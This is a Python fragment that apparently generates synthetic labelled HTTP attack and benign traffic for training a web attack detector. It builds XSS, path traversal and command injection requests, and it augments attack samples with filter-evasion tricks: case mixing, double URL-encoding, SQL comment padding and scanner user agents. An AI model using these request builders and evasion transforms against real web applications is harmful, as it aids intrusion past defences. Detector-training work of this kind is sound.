    payload = random.choice(XSS_PAYLOADS)  # nosec B311
    param = random.choice(['q', 'search', 'comment', 'name', 'input', 'msg'])  # nosec B311
    method = random.choices(['GET', 'POST'], weights=[50, 50])[0]  # nosec B311
    path = random.choice(['/search', '/comment', '/feedback', '/api/posts', '/tienda1/publico/pagar.jsp'])  # nosec B311

    url, body = path, ''
    if method == 'GET':
        url = f"{path}?{param}={payload}"
    else:
        body = f"{param}={payload}&submit=ok"

    return {
        'method': method, 'url': url,
        'headers': _attack_headers(),
        'body': body, 'ip': _rand_ip(), 'label': 1, 'attack_type': 'xss',
    }


# ── Path Traversal generator ─────────────────────────────────────────────────
def _gen_path_traversal() -> Dict:
    payload = random.choice(PATH_TRAVERSAL_PAYLOADS)  # nosec B311
    param = random.choice(['file', 'path', 'name', 'doc', 'resource', 'template'])  # nosec B311
    path = random.choice(['/download', '/file', '/static', '/api/files', '/docs', '/view'])  # nosec B311
    url = f"{path}?{param}={payload}"

    return {
        'method': 'GET', 'url': url,
        'headers': _attack_headers(),
        'body': '', 'ip': _rand_ip(), 'label': 1, 'attack_type': 'path_traversal',
    }


# ── Command Injection generator ───────────────────────────────────────────────
def _gen_cmd_injection() -> Dict:
    payload = random.choice(CMD_INJECTION_PAYLOADS)  # nosec B311
    param = random.choice(['host', 'cmd', 'ip', 'target', 'exec', 'command'])  # nosec B311
    path = random.choice(['/ping', '/api/nslookup', '/tools/check', '/admin/exec'])  # nosec B311

    method = random.choices(['GET', 'POST'], weights=[50, 50])[0]  # nosec B311
    url, body = path, ''
    if method == 'GET':
        url = f"{path}?{param}=localhost{payload}"
    else:
        body = f"{param}=localhost{payload}&submit=run"

    return {
        'method': method, 'url': url,
        'headers': _attack_headers(),
        'body': body, 'ip': _rand_ip(), 'label': 1, 'attack_type': 'cmd_injection',
    }


# ── Main generator ────────────────────────────────────────────────────────────
def generate_dataset(
    n_normal: int = 6000,
    n_modern_normal: int = 4000,
    # CSIC 2010 style
    n_sqli: int = 1500,
    n_xss: int = 1500,
    n_path_traversal: int = 800,
    n_cmd_injection: int = 600,
    # OWASP Juice Shop
    n_juice_sqli: int = 600,
    n_juice_xss: int = 600,
    n_idor: int = 1500,
    # HTTPParams fuzzing
    n_http_params: int = 1500,
    # New attack types
    n_nosql: int = 400,
    n_jwt_abuse: int = 300,
    n_ssrf: int = 300,
    n_xxe: int = 200,
) -> pd.DataFrame:
    """Generate a complete synthetic HTTP security dataset (3-dataset fusion)."""
    print("[Dataset] Generating multi-dataset synthetic traffic...")
    print("  Sources: CSIC 2010 style + OWASP Juice Shop + HTTPParams fuzzing + Modern SPA")
    rows = []

    generators = [
        (_gen_normal,          n_normal,          'normal'),
        (_gen_modern_normal,   n_modern_normal,   'normal [modern-spa]'),
        # Dataset 1: CSIC 2010 style
        (_gen_sqli,            n_sqli,            'sqli'),
        (_gen_xss,             n_xss,             'xss'),
        (_gen_path_traversal,  n_path_traversal,  'path_traversal'),
        (_gen_cmd_injection,   n_cmd_injection,   'cmd_injection'),
        # Dataset 2: OWASP Juice Shop
        (_gen_juice_shop_sqli, n_juice_sqli,      'sqli [juice-shop]'),
        (_gen_juice_shop_xss,  n_juice_xss,       'xss [juice-shop]'),
        (_gen_idor,            n_idor,            'idor [juice-shop]'),
        # Dataset 3: HTTPParams fuzzing
        (_gen_http_params,     n_http_params,     'http_params [httparams]'),
        # New attack types
        (_gen_nosql,           n_nosql,           'nosql_injection'),
        (_gen_jwt_abuse,       n_jwt_abuse,       'jwt_abuse'),
        (_gen_ssrf,            n_ssrf,            'ssrf'),
        (_gen_xxe,             n_xxe,             'xxe'),
    ]

    for gen_fn, count, label in generators:
        print(f"  {label}: {count} samples")
        for _ in range(count):
            rows.append(gen_fn())

    random.shuffle(rows)  # nosec B311
    df = pd.DataFrame(rows)
    print(f"  Total: {len(df)} samples  ({df[df['label']==1].shape[0]} malicious, {df[df['label']==0].shape[0]} benign)")
    return df


# ── CSIC 2010 parser ──────────────────────────────────────────────────────────
def parse_csic_2010(filepath: str, label: int, attack_type: str = 'sqli') -> List[Dict]:
    """
    Parse a CSIC 2010 HTTP dataset file.

    Supports two formats:
      1. Raw HTTP/1.1 requests separated by blank lines.
      2. Wrapped format with 'Start - Id: N' / 'class: Valid|Attack' /
         <raw HTTP request> / 'End - Id: N' blocks (also separated by
         blank lines, but the request itself may contain blank lines
         between headers and body).

    Download from: http://www.isi.csic.es/dataset/

    Args:
        filepath: Path to normalTrafficTraining.txt or anomalousTrafficTest.txt
        label: 0 = normal, 1 = malicious
        attack_type: label for malicious traffic (default: 'sqli')
    """
    import os
    if not os.path.exists(filepath):
        print(f"  [CSIC] File not found: {filepath} — skipping.")
        return []

    print(f"  [CSIC] Parsing: {filepath}")
    requests = []

    with open(filepath, 'r', encoding='latin-1', errors='ignore') as fh:
        content = fh.read()

    # Wrapped format: split on 'Start - Id:' markers.
    if re.search(r'^Start - Id:', content, re.M):
        raw_blocks = re.split(r'^Start - Id:.*$', content, flags=re.M)[1:]
    else:
        raw_blocks = re.split(r'\r?\n\r?\n', content.strip())

    for block in raw_blocks:
        lines = [l for l in block.splitlines()]
        # Skip leading 'class:' / blank lines until the request line.
        idx = 0
        while idx < len(lines) and not re.match(
            r'^(GET|POST|PUT|DELETE|HEAD|OPTIONS)\s+(\S+)\s+HTTP/[\d.]+', lines[idx], re.I
        ):
            idx += 1
        if idx >= len(lines):
            continue

        m = re.match(r'^(GET|POST|PUT|DELETE|HEAD|OPTIONS)\s+(\S+)\s+HTTP/[\d.]+', lines[idx], re.I)
        method = m.group(1).upper()
        url = m.group(2)
        headers: Dict[str, str] = {}
        body_lines = []
        in_body = False

        for line in lines[idx + 1:]:
            if re.match(r'^End - Id:', line):
                break
            if not in_body:
                if line == '':
                    in_body = True
                elif ':' in line:
                    k, _, v = line.partition(':')
                    headers[k.strip()] = v.strip()
            else:
                body_lines.append(line)

        body = '\n'.join(body_lines).strip()
        if body == 'null':
            body = ''

        requests.append({
            'method': method,
            'url': url,
            'headers': headers,
            'body': body,
            'ip': _rand_ip(),
            'label': label,
            'attack_type': attack_type if label == 1 else 'normal',
        })

    print(f"  [CSIC] Loaded {len(requests)} requests from {filepath}")
    return requests


# ── Labeled-sample augmentation (uploaded site-specific data) ────────────────
SQL_XSS_KEYWORDS_RE = re.compile(
    r'\b(select|union|insert|update|delete|drop|or|and|script|alert|onerror|onload)\b',
    re.I,
)

SCANNER_UAS = [
    'sqlmap/1.7.8#stable', 'python-requests/2.28', 'Nikto/2.1.6',
    'curl/7.68.0', 'OWASP-Scanner/1.0', 'dirbuster/1.0',
]


def _randomize_case(text: str) -> str:
    """Randomly upper/lower-case characters within SQL/XSS keywords (e.g. UnIoN SeLeCt)."""
    def _mix(match):
        return ''.join(random.choice((c.upper(), c.lower())) for c in match.group(0))  # nosec B311
    return SQL_XSS_KEYWORDS_RE.sub(_mix, text)


def _url_encode_query(url: str, double: bool = False) -> str:
    """Percent-encode (optionally double-encode) special characters in the query string."""
    if '?' not in url:
        return url
    path, _, query = url.partition('?')

    def _enc(ch):
        encoded = f'%{ord(ch):02X}'
        return f'%25{encoded[1:]}' if double else encoded

    special = set("'\"<> ;()|&`$")
    encoded_query = ''.join(_enc(c) if c in special else c for c in query)
    return f'{path}?{encoded_query}'


def _pad_with_comments(text: str) -> str:
    """Insert SQL comment markers / extra whitespace into a string (malicious only)."""
    if not text:
        return text
    paddings = ['/**/', '  ', '/*comment*/', ' /*x*/']
    pos = random.randint(0, len(text))  # nosec B311
    return text[:pos] + random.choice(paddings) + text[pos:]  # nosec B311


def _reorder_params(url_or_body: str) -> str:
    """Shuffle the order of `key=value` pairs joined by `&`."""
    if '&' not in url_or_body:
        return url_or_body
    if '?' in url_or_body:
        prefix, _, query = url_or_body.partition('?')
        sep = '?'
    else:
        prefix, query, sep = '', url_or_body, ''
    parts = query.split('&')
    random.shuffle(parts)  # nosec B311
    return f'{prefix}{sep}{"&".join(parts)}' if sep else '&'.join(parts)


def augment_labeled_samples(samples: List[Dict], variants_per_sample: int = 5) -> List[Dict]:
    """
    Generate synthetic variants of user-uploaded labeled requests.

    Each input sample (canonical dict with method/url/headers/body/ip/label/
    attack_type) is expanded into `variants_per_sample` additional variants
    using cheap, safe transformations (URL-encoding, case randomization,
    comment padding, parameter reordering, header variation). The original
    samples are preserved as-is alongside their variants.

    This is purely additive — it does not modify generate_dataset() or any
    of the existing _gen_* generators.
    """
    augmented: List[Dict] = list(samples)

    for sample in samples:
        label = sample.get('label', 0)
        attack_type = sample.get('attack_type', 'normal' if label == 0 else 'custom')

        for _ in range(variants_per_sample):
            url = sample.get('url', '/')
            body = sample.get('body', '') or ''
            headers = dict(sample.get('headers', {}) or {})

            transform = random.random()  # nosec B311
            if transform < 0.25:
                url = _url_encode_query(url, double=random.random() < 0.3)  # nosec B311
            elif transform < 0.5:
                url = _randomize_case(url)
                body = _randomize_case(body)
            elif transform < 0.75:
                url = _reorder_params(url)
                body = _reorder_params(body)
            else:
                if label == 1:
                    url = _pad_with_comments(url)
                    body = _pad_with_comments(body)
                else:
                    url = _reorder_params(url)

            if label == 1 and random.random() < 0.3:  # nosec B311
                headers['User-Agent'] = random.choice(SCANNER_UAS)  # nosec B311
            else:
                headers['User-Agent'] = random.choice(NORMAL_UAS)  # nosec B311

            augmented.append({
                'method': sample.get('method', 'GET'),
                'url': url,
                'headers': headers,
                'body': body,
                'ip': _rand_ip(),
                'label': label,
                'attack_type': attack_type,
            })

    return augmented
